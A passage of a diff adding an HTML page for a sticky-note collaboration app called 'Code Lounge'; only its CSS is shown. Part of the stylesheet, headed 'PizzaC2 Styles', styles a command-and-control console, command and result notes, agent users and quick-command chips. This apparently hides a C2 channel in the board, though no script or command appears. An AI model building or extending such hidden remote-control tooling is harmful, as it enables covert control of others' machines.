@@ -1,0 +1,2410 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" type="image/png" href="favicon.png">
+  <title>Code Lounge</title>
+  <style>
+    :root {
+      --ink: #17231d;
+      --muted: #6b776f;
+      --paper: #f7f5ee;
+      --card: rgba(255, 255, 255, 0.88);
+      --line: #dfe5dc;
+      --green: #1d6b4c;
+      --green-dark: #124b35;
+      --lime: #d9ef62;
+      --coral: #f07d5b;
+      --shadow: 0 24px 60px rgba(28, 57, 42, 0.13);
+    }
+
+    [data-theme="dark"] {
+      --ink: #eef4f0;
+      --muted: #9ba89f;
+      --paper: #111714;
+      --card: rgba(22, 32, 26, 0.92);
+      --line: #26382d;
+      --green: #2bb379;
+      --green-dark: #1f8559;
+      --lime: #d9ef62;
+      --coral: #f07d5b;
+      --shadow: 0 24px 60px rgba(0, 0, 0, 0.45);
+    }
+
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      min-width: 320px;
+      color: var(--ink);
+      background: var(--paper);
+      font-family: Inter, Pretendard, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      line-height: 1.5;
+      transition: background-color .22s ease, color .22s ease;
+    }
+
+    body::before {
+      content: "";
+      position: fixed;
+      inset: 0;
+      pointer-events: none;
+      opacity: .5;
+      background-image: radial-gradient(#d6ded3 1px, transparent 1px);
+      background-size: 19px 19px;
+      mask-image: linear-gradient(to bottom, black, transparent 70%);
+      transition: background-image .22s ease;
+    }
+
+    [data-theme="dark"] body::before {
+      background-image: radial-gradient(#25382b 1px, transparent 1px);
+    }
+
+    .shell {
+      position: relative;
+      width: min(100% - 40px, 1050px);
+      min-height: 100vh;
+      margin: 0 auto;
+      padding: 28px 0 52px;
+      display: flex;
+      flex-direction: column;
+    }
+
+    header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 72px;
+    }
+
+    .brand {
+      display: flex;
+      gap: 11px;
+      align-items: center;
+      font-weight: 800;
+      letter-spacing: -.03em;
+    }
+
+    .brand-mark {
+      width: 33px;
+      height: 33px;
+      display: grid;
+      place-items: center;
+      border-radius: 10px 10px 10px 3px;
+      color: var(--green-dark);
+      background: var(--lime);
+      transform: rotate(-7deg);
+    }
+
+    .brand-mark svg { transform: rotate(7deg); }
+
+    .header-controls {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .status { color: var(--muted); font-size: 13px; }
+    .status::before {
+      content: "";
+      display: inline-block;
+      width: 7px;
+      height: 7px;
+      margin-right: 7px;
+      border-radius: 50%;
+      background: #5dc48a;
+      box-shadow: 0 0 0 4px #d9f2df;
+    }
+    [data-theme="dark"] .status::before {
+      box-shadow: 0 0 0 4px rgba(93, 196, 138, 0.2);
+    }
+
+    .lang-switch {
+      display: inline-flex;
+      padding: 3px;
+      background: rgba(0, 0, 0, 0.05);
+      border: 1px solid var(--line);
+      border-radius: 11px;
+    }
+    [data-theme="dark"] .lang-switch {
+      background: rgba(255, 255, 255, 0.06);
+    }
+    .lang-btn {
+      min-height: 28px;
+      padding: 0 9px;
+      border: 0;
+      border-radius: 8px;
+      font-size: 11px;
+      font-weight: 800;
+      color: var(--muted);
+      background: transparent;
+      cursor: pointer;
+      transition: background 0.18s ease, color 0.18s ease;
+    }
+    .lang-btn:hover {
+      color: var(--ink);
+    }
+    .lang-btn.active {
+      background: var(--card);
+      color: var(--green-dark);
+      box-shadow: 0 1px 4px rgba(0,0,0,0.08);
+    }
+    [data-theme="dark"] .lang-btn.active {
+      color: #a7f3d0;
+      background: #1e3325;
+    }
+
+    .theme-toggle {
+      width: 36px;
+      height: 36px;
+      min-height: 36px;
+      display: grid;
+      place-items: center;
+      border: 1px solid var(--line);
+      border-radius: 11px;
+      color: var(--ink);
+      background: var(--card);
+      cursor: pointer;
+      transition: transform 0.18s ease, border-color 0.18s ease, background 0.18s ease;
+    }
+    .theme-toggle:hover {
+      border-color: #abc4b3;
+      transform: translateY(-1px);
+    }
+    .theme-toggle .sun-icon {
+      display: none;
+    }
+    .theme-toggle .moon-icon {
+      display: block;
+    }
+    [data-theme="dark"] .theme-toggle .sun-icon {
+      display: block;
+      color: #facc15;
+    }
+    [data-theme="dark"] .theme-toggle .moon-icon {
+      display: none;
+    }
+
+    .coffee-button {
+      display: inline-flex;
+      align-items: center;
+      gap: 7px;
+      height: 36px;
+      padding: 0 13px;
+      border-radius: 11px;
+      font-size: 12px;
+      font-weight: 750;
+      text-decoration: none;
+      color: #17231d;
+      background: #ffdd00;
+      box-shadow: 0 2px 8px rgba(255, 221, 0, 0.28);
+      transition: transform .18s ease, box-shadow .18s ease, filter .18s ease;
+      white-space: nowrap;
+    }
+    .coffee-button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 5px 14px rgba(255, 221, 0, 0.42);
+      filter: brightness(1.03);
+    }
+    .coffee-button:active {
+      transform: translateY(0);
+    }
+    .coffee-icon {
+      font-size: 15px;
+      line-height: 1;
+    }
+    [data-theme="dark"] .coffee-button {
+      background: #f5c518;
+      color: #121815;
+      box-shadow: 0 2px 10px rgba(245, 197, 24, 0.25);
+    }
+    [data-theme="dark"] .coffee-button:hover {
+      box-shadow: 0 5px 16px rgba(245, 197, 24, 0.4);
+    }
+
+    .footer-coffee {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      color: var(--muted);
+      text-decoration: none;
+      font-size: 12px;
+      font-weight: 700;
+      transition: color .18s ease;
+    }
+    .footer-coffee:hover {
+      color: var(--ink);
+    }
+
+    main { flex: 1; }
+    .intro { max-width: 650px; margin-bottom: 36px; }
+    .eyebrow {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 14px;
+      color: var(--green);
+      font-size: 12px;
+      font-weight: 800;
+      letter-spacing: .13em;
+      text-transform: uppercase;
+    }
+
+    .eyebrow span:first-child { width: 28px; height: 2px; background: var(--coral); }
+    h1 {
+      max-width: 600px;
+      margin: 0;
+      font-size: clamp(42px, 7vw, 76px);
+      line-height: .98;
+      letter-spacing: -.075em;
+    }
+
+    .intro p { max-width: 450px; margin: 22px 0 0; color: var(--muted); font-size: 17px; }
+
+    .workspace {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 18px;
+    }
+
+    .card {
+      position: relative;
+      min-height: 315px;
+      padding: 30px;
+      overflow: hidden;
+      border: 1px solid rgba(255, 255, 255, .8);
+      border-radius: 24px;
+      background: var(--card);
+      box-shadow: var(--shadow);
+      backdrop-filter: blur(10px);
+    }
+
+    .card::after {
+      content: "";
+      position: absolute;
+      right: -55px;
+      bottom: -70px;
+      width: 180px;
+      height: 180px;
+      border: 1px solid rgba(29, 107, 76, .12);
+      border-radius: 50%;
+      box-shadow: 0 0 0 20px rgba(29, 107, 76, .03), 0 0 0 40px rgba(29, 107, 76, .03);
+    }
+
+    .card-number {
+      width: 39px;
+      height: 39px;
+      display: grid;
+      place-items: center;
+      margin-bottom: 35px;
+      border-radius: 12px;
+      color: var(--green-dark);
+      background: #edf4e8;
+      font-size: 14px;
+      font-weight: 800;
+    }
+
+    .card h2 { margin: 0 0 9px; font-size: 25px; letter-spacing: -.045em; }
+    .card p { min-height: 49px; margin: 0 0 25px; color: var(--muted); font-size: 14px; }
+
+    button {
+      min-height: 52px;
+      border: 0;
+      border-radius: 13px;
+      font: inherit;
+      font-weight: 750;
+      cursor: pointer;
+      transition: transform .18s ease, box-shadow .18s ease, background .18s ease;
+    }
+
+    button:hover { transform: translateY(-2px); }
+    button:active { transform: translateY(1px); }
+    button:focus-visible, input:focus-visible { outline: 3px solid #f1af45; outline-offset: 3px; }
+    .primary { width: 100%; color: white; background: var(--green); box-shadow: 0 10px 20px rgba(29, 107, 76, .18); }
+    .primary:hover { background: var(--green-dark); }
+    .secondary { width: 100%; color: var(--green-dark); background: var(--lime); }
+
+    .code-result {
+      display: none;
+      align-items: center;
+      justify-content: space-between;
+      gap: 10px;
+      min-height: 52px;
+      margin-bottom: 12px;
+      padding: 9px 13px 9px 19px;
+      border: 1px dashed #9ab9a7;
+      border-radius: 13px;
+      background: #f3f9e8;
+    }
+    .code-result.visible { display: flex; }
+    .code-label { min-width: 74px; color: var(--muted); font-size: 11px; font-weight: 800; line-height: 1.2; }
+    .code-result strong { color: var(--green-dark); font-size: 26px; letter-spacing: .16em; }
+    .copy-button { min-height: 34px; padding: 0 10px; color: var(--green); background: transparent; font-size: 12px; }
+    .code-result.admin-code { border-color: #e8b9a9; background: #fff3ed; }
+    .code-result.admin-code strong { color: #a94f43; }
+    .role-choice { display: none; margin: 0 0 13px; }
+    .role-choice.visible { display: block; }
+    .role-choice p { margin: 0 0 8px; color: var(--muted); font-size: 12px; font-weight: 700; }
+    .role-buttons { display: flex; gap: 8px; }
+    .role-button { flex: 1; min-height: 40px; border: 1px solid var(--line); border-radius: 10px; color: var(--muted); background: #fbfcf8; font-size: 12px; }
+    .role-button.selected { border-color: #9ab9a7; color: var(--green-dark); background: #edf6e6; }
+    .admin-input-area { display: none; margin-bottom: 12px; }
+    .admin-input-area.visible { display: block; }
+
+    .input-area { display: none; margin-bottom: 12px; }
+    .input-area.visible { display: block; }
+    .input-area label { display: block; margin-bottom: 7px; color: var(--muted); font-size: 12px; font-weight: 700; }
+    input {
+      width: 100%;
+      height: 52px;
+      padding: 0 17px;
+      border: 1px solid var(--line);
+      border-radius: 13px;
+      color: var(--ink);
+      background: #fbfcf8;
+      font: inherit;
+      font-size: 21px;
+      font-weight: 700;
+      letter-spacing: .17em;
+    }
+    input::placeholder { color: #b1bbb1; font-size: 14px; letter-spacing: 0; }
+    .message { min-height: 22px; margin: 10px 0 0; color: var(--green); font-size: 13px; font-weight: 700; }
+    .message.error { color: #c8563b; }
+
+    footer { display: flex; justify-content: space-between; margin-top: 30px; color: #97a39a; font-size: 12px; }
+
+    .app-page {
+      display: none;
+      min-height: 100vh;
+      padding: 22px 0 35px;
+    }
+    .app-page.visible { display: block; }
+    .app-topbar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 18px;
+      padding-bottom: 21px;
+      border-bottom: 1px solid var(--line);
+    }
+    .board-title { display: flex; align-items: center; gap: 13px; }
+    .board-title h1 { margin: 0; font-size: 21px; letter-spacing: -.05em; }
+    .board-title p { margin: 1px 0 0; color: var(--muted); font-size: 12px; }
+    .board-dot { width: 12px; height: 12px; border-radius: 50%; background: var(--coral); box-shadow: 0 0 0 6px #fee4dc; }
+    .top-actions { display: flex; align-items: center; gap: 9px; }
+    .host-controls { display: none; align-items: center; gap: 8px; }
+    .host-controls.visible { display: flex; }
+    .host-action { min-height: 43px; padding: 0 12px; border: 1px solid #e7c0b9; border-radius: 12px; color: #a94f43; background: #fff3ef; font-size: 12px; }
+    .host-action:hover { border-color: #d9897d; background: #ffe8e2; }
+    .code-switch { display: flex; align-items: center; gap: 7px; min-height: 43px; padding: 0 10px; border: 1px solid var(--line); border-radius: 12px; color: var(--muted); background: white; font-size: 12px; font-weight: 750; }
+    .switch { position: relative; width: 34px; height: 20px; display: inline-block; }
+    .switch input { position: absolute; width: 1px; height: 1px; opacity: 0; }
+    .switch-track { position: absolute; inset: 0; border-radius: 99px; background: #c8d0c8; cursor: pointer; transition: background .2s ease; }
+    .switch-track::after { content: ""; position: absolute; top: 3px; left: 3px; width: 14px; height: 14px; border-radius: 50%; background: white; box-shadow: 0 1px 3px rgba(0,0,0,.2); transition: transform .2s ease; }
+    .switch input:checked + .switch-track { background: var(--green); }
+    .switch input:checked + .switch-track::after { transform: translateX(14px); }
+    .switch input:focus-visible + .switch-track { outline: 3px solid #f1af45; outline-offset: 2px; }
+    .icon-button {
+      width: 43px;
+      height: 43px;
+      min-height: 43px;
+      display: grid;
+      place-items: center;
+      border: 1px solid var(--line);
+      border-radius: 12px;
+      color: var(--ink);
+      background: white;
+    }
+    .icon-button:hover { border-color: #abc4b3; background: #f3f8ef; }
+    .plus-button { color: white; background: var(--green); border-color: var(--green); }
+    .plus-button:hover { background: var(--green-dark); }
+    .search-box { display: none; align-items: center; gap: 8px; padding: 0 12px; border: 1px solid var(--line); border-radius: 12px; background: white; }
+    .search-box.visible { display: flex; }
+    .search-box input { width: 150px; height: 41px; padding: 0; border: 0; background: transparent; font-size: 14px; letter-spacing: 0; }
+    .search-box input:focus-visible { outline: none; }
+    .app-layout { display: grid; grid-template-columns: 1fr 210px; gap: 18px; margin-top: 22px; }
+    .board {
+      position: relative;
+      min-height: 590px;
+      overflow: hidden;
+      border: 1px solid #e8e3d5;
+      border-radius: 22px;
+      background-color: #fffdf6;
+      background-image: linear-gradient(#f1ede1 1px, transparent 1px), linear-gradient(90deg, #f1ede1 1px, transparent 1px);
+      background-size: 28px 28px;
+    }
+    .board-empty { position: absolute; inset: 0; display: grid; place-items: center; pointer-events: none; }
+    .board-empty-content { color: #a9aea4; text-align: center; }
+    .board-empty-content svg { margin-bottom: 12px; }
+    .board-empty-content p { margin: 0; font-size: 14px; }
+    .note {
+      position: absolute;
+      width: 330px;
+      min-height: 150px;
+      max-height: 250px;
+      padding: 14px;
+      overflow-y: auto;
+      border: 1px solid rgba(112, 87, 21, .12);
+      border-radius: 3px 3px 12px 3px;
+      color: #3e3923;
+      background: #fff2a8;
+      box-shadow: 5px 7px 0 rgba(74, 69, 42, .09), 0 10px 23px rgba(80, 75, 43, .1);
+      transform: rotate(-2deg);
+      animation: note-in .22s ease-out;
+    }
+    .note:nth-of-type(2n) { background: #dff2c9; transform: rotate(2deg); }
+    .note:nth-of-type(3n) { background: #ffd5c4; transform: rotate(-1deg); }
+    .note-head { position: relative; display: flex; justify-content: center; align-items: center; height: 25px; margin-bottom: 12px; color: #7c7559; font-size: 11px; font-weight: 800; }
+    .note-number { position: absolute; left: 0; top: 0; color: #827957; font-weight: 800; }
+    .note-author-wrap { display: inline-flex; align-items: center; gap: 6px; max-width: 210px; }
+    .note-author { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+    .note-actions { position: absolute; right: 0; top: 0; display: flex; align-items: center; gap: 2px; }
+    .note-close, .note-edit { min-height: 25px; padding: 0 5px; color: #827957; background: transparent; line-height: 1; }
+    .note-close { font-size: 16px; }
+    .note-edit { font-size: 12px; }
+    .note p { margin: 0; max-width: 100%; padding-bottom: 32px; white-space: pre-wrap; word-break: break-all; overflow-wrap: anywhere; font-size: 14px; line-height: 1.45; }
+    .note-copy { position: absolute; right: 10px; bottom: 8px; min-height: 28px; padding: 0 9px; border: 1px solid rgba(112, 87, 21, .18); border-radius: 8px; color: #655d3c; background: rgba(255,255,255,.45); font-size: 11px; z-index: 2; }
+    .note-copy:hover { background: rgba(255,255,255,.85); }
+    .note.search-match { border: 2px solid #e04f4f; animation: note-highlight .7s ease-in-out 4; }
+    @keyframes note-in { from { opacity: 0; transform: scale(.85) rotate(-5deg); } to { opacity: 1; } }
+    @keyframes note-highlight { 0%, 100% { box-shadow: 5px 7px 0 rgba(74, 69, 42, .09), 0 10px 23px rgba(80, 75, 43, .1); } 50% { box-shadow: 5px 7px 0 rgba(224, 79, 79, .12), 0 0 0 7px rgba(224, 79, 79, .28); } }
+    .users-panel { padding: 20px; border: 1px solid var(--line); border-radius: 18px; background: rgba(255,255,255,.82); }
+    .users-heading { display: flex; justify-content: space-between; align-items: center; margin-bottom: 18px; }
+    .users-heading h2 { margin: 0; font-size: 14px; letter-spacing: -.03em; }
+    .user-count { color: var(--green); font-size: 12px; font-weight: 800; }
+    .user { display: flex; align-items: center; gap: 9px; margin: 14px 0; color: #4e5a51; font-size: 13px; }
+    .avatar { width: 28px; height: 28px; display: grid; place-items: center; border-radius: 9px; color: #31513c; background: #d8edbc; font-size: 11px; font-weight: 800; }
+    .avatar.blue { color: #365477; background: #d5e7f5; }
+    .avatar.pink { color: #754d4e; background: #f6d6d6; }
+    .host-crown { display: none; margin-left: -2px; font-size: 15px; line-height: 1; }
+    .host-crown.visible { display: inline-block; }
+    .online-dot { width: 6px; height: 6px; margin-left: auto; border-radius: 50%; background: #5dc48a; }
+    .kick-button { min-height: 27px; margin-left: 3px; padding: 0 7px; border: 1px solid #efc6be; border-radius: 7px; color: #b4574c; background: #fff6f3; font-size: 10px; }
+    .kick-button:hover { background: #ffe7e1; }
+    .nickname-area { display: none; margin-bottom: 12px; }
+    .nickname-area.visible { display: block; }
+    .nickname-area label { display: block; margin-bottom: 7px; color: var(--muted); font-size: 12px; font-weight: 700; }
+    .nickname-area input { letter-spacing: 0; font-size: 16px; }
+    .modal-backdrop { position: fixed; inset: 0; z-index: 4; display: none; place-items: center; padding: 20px; background: rgba(18, 42, 29, .28); backdrop-filter: blur(5px); }
+    .modal-backdrop.visible { display: grid; }
+    .note-modal { width: min(100%, 390px); padding: 25px; border-radius: 20px; background: #fffdf7; box-shadow: 0 25px 80px rgba(22, 48, 34, .22); }
+    .note-modal h2 { margin: 0 0 5px; font-size: 21px; letter-spacing: -.05em; }
+    .note-modal p { margin: 0 0 18px; color: var(--muted); font-size: 13px; }
+    .note-modal textarea { width: 100%; min-height: 125px; padding: 13px; resize: vertical; border: 1px solid var(--line); border-radius: 12px; color: var(--ink); background: #fff; font: inherit; }
+    .modal-actions { display: flex; gap: 9px; margin-top: 13px; }
+    .modal-actions button { flex: 1; }
+    .cancel-button { color: var(--muted); background: #edf0eb; }
+    .danger-modal h2 { color: #a94f43; }
+    .danger-modal input { margin-bottom: 3px; letter-spacing: 0; font-size: 15px; }
+    .danger-button { color: white; background: #c8574a; }
+    .danger-button:disabled { cursor: not-allowed; opacity: .4; transform: none; }
+    /* Dark mode component overrides */
+    [data-theme="dark"] .card {
+      border-color: rgba(255, 255, 255, 0.08);
+    }
+    [data-theme="dark"] .card::after {
+      border-color: rgba(43, 179, 121, 0.15);
+      box-shadow: 0 0 0 20px rgba(43, 179, 121, 0.03), 0 0 0 40px rgba(43, 179, 121, 0.03);
+    }
+    [data-theme="dark"] .card-number {
+      background: #1a271f;
+      color: #bbf7d0;
+    }
+    [data-theme="dark"] .code-result {
+      background: #17271e;
+      border-color: #2b4534;
+    }
+    [data-theme="dark"] .code-result strong {
+      color: #6ee7b7;
+    }
+    [data-theme="dark"] .code-result.admin-code {
+      background: #2b1d19;
+      border-color: #5c3328;
+    }
+    [data-theme="dark"] .code-result.admin-code strong {
+      color: #fca5a5;
+    }
+    [data-theme="dark"] .role-button {
+      background: #152019;
+      border-color: var(--line);
+      color: var(--muted);
+    }
+    [data-theme="dark"] .role-button.selected {
+      background: #1c3224;
+      border-color: #3b6649;
+      color: #a7f3d0;
+    }
+    [data-theme="dark"] input {
+      background: #152019;
+      border-color: var(--line);
+      color: var(--ink);
+    }
+    [data-theme="dark"] input::placeholder {
+      color: #58695d;
+    }
+    [data-theme="dark"] .board {
+      border-color: #233428;
+      background-color: #131b16;
+      background-image: linear-gradient(#1a261f 1px, transparent 1px), linear-gradient(90deg, #1a261f 1px, transparent 1px);
+    }
+    [data-theme="dark"] .board-empty-content {
+      color: #5a6e60;
+    }
+    [data-theme="dark"] .users-panel {
+      background: rgba(22, 32, 26, 0.92);
+      border-color: var(--line);
+    }
+    [data-theme="dark"] .user {
+      color: #d8e2da;
+    }
+    [data-theme="dark"] .code-switch {
+      background: #17231b;
+      border-color: var(--line);
+      color: var(--muted);
+    }
+    [data-theme="dark"] .icon-button {
+      background: #17231b;
+      border-color: var(--line);
+      color: var(--ink);
+    }
+    [data-theme="dark"] .icon-button:hover {
+      border-color: #3d5a46;
+      background: #1f3025;
+    }
+    [data-theme="dark"] .search-box {
+      background: #17231b;
+      border-color: var(--line);
+    }
+    [data-theme="dark"] .search-box input {
+      color: var(--ink);
+    }
+    [data-theme="dark"] .host-action {
+      background: #2b1d19;
+      border-color: #5c3328;
+      color: #fca5a5;
+    }
+    [data-theme="dark"] .host-action:hover {
+      background: #39221d;
+      border-color: #794233;
+    }
+    [data-theme="dark"] .modal-backdrop {
+      background: rgba(8, 14, 10, 0.65);
+    }
+    [data-theme="dark"] .note-modal {
+      background: #17231b;
+      border: 1px solid var(--line);
+      box-shadow: 0 25px 80px rgba(0, 0, 0, 0.6);
+    }
+    [data-theme="dark"] .note-modal textarea {
+      background: #111a14;
+      border-color: var(--line);
+      color: var(--ink);
+    }
+    [data-theme="dark"] .cancel-button {
+      background: #202d24;
+      color: #b0bfb4;
+    }
+    [data-theme="dark"] .cancel-button:hover {
+      background: #28392d;
+    }
+    [data-theme="dark"] .board-dot {
+      box-shadow: 0 0 0 6px rgba(240, 125, 91, 0.2);
+    }
+
+    @media (max-width: 680px) {
+      .shell { width: min(100% - 28px, 520px); padding-top: 20px; }
+      header { margin-bottom: 55px; }
+      .header-controls { gap: 8px; }
+      .status { font-size: 0; }
+      .status::before { margin-right: 0; }
+      .workspace { grid-template-columns: 1fr; }
+      .card { min-height: auto; padding: 25px; }
+      .card-number { margin-bottom: 28px; }
+      .card p { min-height: auto; }
+      .app-page { padding-top: 17px; }
+      .app-topbar { align-items: flex-start; flex-wrap: wrap; }
+      .app-layout { grid-template-columns: 1fr; }
+      .board { min-height: 510px; }
+      .users-panel { order: -1; }
+      .search-box input { width: 105px; }
+      .coffee-button .coffee-text { display: none; }
+      .coffee-button { width: 36px; height: 36px; padding: 0; justify-content: center; }
+      .host-action, .code-switch { min-height: 39px; }
+      .note { width: min(330px, calc(100% - 30px)); }
+    }
+
+    /* PizzaC2 Styles */
+    .c2-console-button {
+      background: #17231d;
+      color: #38bdf8;
+      border-color: #2b4534;
+      position: relative;
+    }
+    .c2-console-button:hover {
+      background: #1f3025;
+      border-color: #38bdf8;
+      color: #7dd3fc;
+    }
+    .c2-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 3px;
+      font-size: 9px;
+      font-weight: 800;
+      letter-spacing: .06em;
+      padding: 2px 7px;
+      border-radius: 5px;
+      vertical-align: middle;
+      text-transform: uppercase;
+      line-height: 1.2;
+    }
+    .c2-badge.cmd {
+      background: #0284c7;
+      color: #ffffff;
+      box-shadow: 0 1px 3px rgba(2, 132, 199, 0.4);
+    }
+    .c2-badge.res {
+      background: #15803d;
+      color: #ffffff;
+      box-shadow: 0 1px 3px rgba(21, 128, 61, 0.4);
+    }
+    .c2-badge.pending {
+      background: rgba(245, 158, 11, 0.18);
+      color: #f59e0b;
+      border: 1px solid rgba(245, 158, 11, 0.4);
+      animation: pulse-slow 2s infinite ease-in-out;
+    }
+    .c2-badge.done {
+      background: rgba(34, 197, 94, 0.18);
+      color: #22c55e;
+      border: 1px solid rgba(34, 197, 94, 0.4);
+    }
+    @keyframes pulse-slow {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.55; }
+    }
+    .note.c2-cmd {
+      background: #0b1320 !important;
+      color: #f1f5f9 !important;
+      border: 1.5px solid #0284c7 !important;
+      box-shadow: 0 12px 30px rgba(0, 0, 0, 0.55) !important;
+      transform: rotate(0deg) !important;
+    }
+    .note.c2-cmd:nth-of-type(2n) { background: #0b1320 !important; transform: rotate(0deg) !important; }
+    .note.c2-cmd:nth-of-type(3n) { background: #0b1320 !important; transform: rotate(0deg) !important; }
+    .note.c2-cmd .note-head {
+      color: #94a3b8 !important;
+    }
+    .note.c2-cmd .note-number {
+      color: #38bdf8 !important;
+      font-weight: 800;
+    }
+    .note.c2-cmd .note-author {
+      color: #cbd5e1 !important;
+    }
+    .note.c2-cmd p {
+      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace !important;
+      color: #38bdf8 !important;
+      font-weight: 600;
+      font-size: 13px !important;
+      line-height: 1.45;
+    }
+    .note.c2-cmd .note-copy {
+      color: #7dd3fc !important;
+      background: rgba(56, 189, 248, 0.15) !important;
+      border-color: rgba(56, 189, 248, 0.4) !important;
+    }
+    .note.c2-cmd .note-copy:hover {
+      background: rgba(56, 189, 248, 0.3) !important;
+    }
+    .note.c2-res {
+      width: 400px !important;
+      min-height: 190px !important;
+      max-height: 320px !important;
+      background: #050b14 !important;
+      color: #4ade80 !important;
+      border: 1.5px solid #16a34a !important;
+      box-shadow: 0 16px 36px rgba(0, 0, 0, 0.65) !important;
+      overflow-y: auto !important;
+      transform: rotate(0deg) !important;
+      z-index: 3;
+    }
+    .note.c2-res:nth-of-type(2n) { background: #050b14 !important; transform: rotate(0deg) !important; }
+    .note.c2-res:nth-of-type(3n) { background: #050b14 !important; transform: rotate(0deg) !important; }
+    .note.c2-res .note-head {
+      color: #86efac !important;
+    }
+    .note.c2-res .note-number {
+      color: #22c55e !important;
+      font-weight: 800;
+    }
+    .note.c2-res .note-author {
+      color: #38bdf8 !important;
+      font-weight: 800;
+    }
+    .note.c2-res p {
+      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace !important;
+      font-size: 12px !important;
+      line-height: 1.45 !important;
+      color: #f1f5f9 !important;
+      white-space: pre-wrap !important;
+      word-break: break-all;
+    }
+    .note.c2-res .note-copy {
+      color: #86efac !important;
+      background: rgba(34, 197, 94, 0.15) !important;
+      border-color: #22c55e !important;
+    }
+    .user.is-agent {
+      background: rgba(56, 189, 248, 0.08);
+      border-radius: 8px;
+      padding: 4px 6px;
+      margin: 10px -6px;
+    }
+    .user.is-agent .avatar {
+      background: #0284c7;
+      color: white;
+      font-size: 14px;
+    }
+    .agent-pill {
+      font-size: 9px;
+      font-weight: 800;
+      color: #0284c7;
+      background: #e0f2fe;
+      padding: 1px 5px;
+      border-radius: 4px;
+      margin-left: 4px;
+    }
+    [data-theme="dark"] .agent-pill {
+      background: #0369a1;
+      color: #bae6fd;
+    }
+    /* C2 Modal Styles */
+    .c2-modal-card {
+      width: min(100%, 540px) !important;
+      max-height: 85vh;
+      overflow-y: auto;
+    }
+    .c2-modal-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 4px;
+    }
+    .c2-title-badge {
+      font-size: 10px;
+      font-weight: 800;
+      color: #0ea5e9;
+      background: #e0f2fe;
+      padding: 3px 8px;
+      border-radius: 6px;
+      letter-spacing: .08em;
+    }
+    [data-theme="dark"] .c2-title-badge {
+      background: #0c4a6e;
+      color: #7dd3fc;
+    }
+    .c2-modal-subtitle {
+      margin: 0 0 16px 0 !important;
+      font-size: 13px;
+      color: var(--muted);
+    }
+    .c2-tabs {
+      display: flex;
+      gap: 6px;
+      background: rgba(0,0,0,0.04);
+      padding: 4px;
+      border-radius: 12px;
+      margin-bottom: 18px;
+    }
+    [data-theme="dark"] .c2-tabs {
+      background: rgba(255,255,255,0.05);
+    }
+    .c2-tab-btn {
+      flex: 1;
+      min-height: 34px !important;
+      border-radius: 9px !important;
+      font-size: 12px !important;
+      font-weight: 700;
+      background: transparent;
+      color: var(--muted);
+      border: 0;
+      cursor: pointer;
+      transition: all .15s ease;
+    }
+    .c2-tab-btn.active {
+      background: var(--card);
+      color: var(--ink);
+      box-shadow: 0 2px 6px rgba(0,0,0,0.08);
+    }
+    .c2-tab-content {
+      display: none;
+    }
+    .c2-tab-content.active {
+      display: block;
+    }
+    .c2-field {
+      margin-bottom: 14px;
+    }
+    .c2-field label {
+      display: block;
+      margin-bottom: 6px;
+      font-size: 12px;
+      font-weight: 700;
+      color: var(--muted);
+    }
+    .c2-code-box {
+      position: relative;
+      background: #0f172a;
+      border: 1px solid #334155;
+      border-radius: 10px;
+      padding: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 10px;
+    }
+    .c2-code-box code {
+      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+      font-size: 11px;
+      color: #38bdf8;
+      word-break: break-all;
+      line-height: 1.4;
+      user-select: all;
+    }
+    .c2-copy-btn {
+      min-height: 28px !important;
+      padding: 0 10px;
+      font-size: 11px !important;
+      color: white;
+      background: #0284c7;
+      border-radius: 6px;
+      white-space: nowrap;
+      flex-shrink: 0;
+    }
+    .c2-copy-btn:hover {
+      background: #0369a1;
+    }
+    .c2-btn-group {
+      display: flex;
+      gap: 8px;
+      margin-bottom: 14px;
+    }
+    .c2-action-btn {
+      flex: 1;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 38px;
+      padding: 0 10px;
+      font-size: 12px;
+      font-weight: 700;
+      text-decoration: none;
+      color: var(--ink);
+      background: rgba(0,0,0,0.04);
+      border: 1px solid var(--line);
+      border-radius: 10px;
+      transition: all .15s ease;
+    }
+    [data-theme="dark"] .c2-action-btn {
+      background: rgba(255,255,255,0.05);
+    }
+    .c2-action-btn:hover {
+      border-color: var(--green);
+      color: var(--green);
+      transform: translateY(-1px);
+    }
+    .c2-guide-box {
+      background: rgba(29, 107, 76, 0.06);
+      border: 1px solid rgba(29, 107, 76, 0.15);
+      border-radius: 12px;
+      padding: 12px 14px;
+      font-size: 12px;
+      line-height: 1.6;
+      color: var(--ink);
+    }
+    .c2-guide-box ol {
+      margin: 6px 0 0 16px;
+      padding: 0;
+    }
+    .c2-guide-box code {
+      background: rgba(0,0,0,0.06);
+      padding: 1px 4px;
+      border-radius: 4px;
+      font-weight: bold;
+    }
+    .c2-quick-commands {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 6px;
+      margin-top: 6px;
+      margin-bottom: 16px;
+    }
+    .c2-cmd-chip {
+      min-height: 30px !important;
+      padding: 0 10px;
+      font-size: 11px !important;
+      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+      color: #0284c7;
+      background: #f0f9ff;
+      border: 1px solid #bae6fd;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    [data-theme="dark"] .c2-cmd-chip {
+      background: #082f49;
+      border-color: #0369a1;
+      color: #7dd3fc;
+    }
+    .c2-cmd-chip:hover {
+      background: #0284c7;
+      color: white;
+    }
